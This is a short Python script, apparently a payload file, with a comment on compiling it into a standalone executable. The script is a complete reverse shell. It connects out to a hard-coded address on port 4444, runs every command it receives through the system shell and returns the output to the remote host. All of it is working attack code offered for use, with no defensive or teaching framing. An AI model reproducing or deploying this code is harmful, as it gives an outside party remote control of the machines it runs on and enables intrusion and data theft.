# compile: pyinstaller --onefile testing payload.py

import socket
import subprocess

ip = "192.168.1.1"
port = 4444


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))


while True:

    command = s.recv(1024).decode()


    if command.lower() == "exit":
        break


    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        s.sendall(output)
    except Exception as e:
        s.sendall(str(e).encode())


s.close()
